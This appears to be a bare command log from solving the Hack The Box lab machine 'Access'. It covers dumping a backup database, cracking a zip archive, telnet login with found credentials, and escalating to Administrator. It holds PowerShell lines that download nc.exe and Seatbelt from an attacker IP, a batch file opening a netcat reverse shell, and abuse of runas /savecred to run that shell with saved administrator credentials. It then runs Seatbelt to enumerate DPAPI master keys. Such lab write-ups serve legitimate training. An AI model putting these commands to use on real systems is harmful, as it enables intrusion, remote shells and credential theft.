```
mdb-tables -1  backup.mdb | grep user

mdb-export backup.mdb auth_user 

7z x -p'access4u@security' ac.zip 

cat  Access\ Control.mbox

telnet access.htb 
security
password

net users
net user administrator

cd Desktop

powershell -c "$client = New-Object Net.WebClient; $client.DownloadFile('http://10.10.14.19:8000/nc.exe', 'nc.exe')"

echo c:\Users\security\Desktop\nc.exe 10.10.14.19 6789 -e cmd.exe > reverse.ba

#Runas can be exploited if net user Administrator have "No Password Required Option" enabled

C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\security\Desktop\reverse.bat" 

powershell -c "$client = New-Object Net.WebClient; $client.DownloadFile('http://10.10.14.19:8000/SeatbeltNet3.5AnyCPU.exe', 'sb.exe')"

sb.exe MasterKeys
sb.exe user

```
https://github.com/carlospolop/winPE/blob/master/binaries/seatbelt/SeatbeltNet3.5AnyCPU.exe
https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
https://www.hackthebox.com/achievement/machine/336799/156
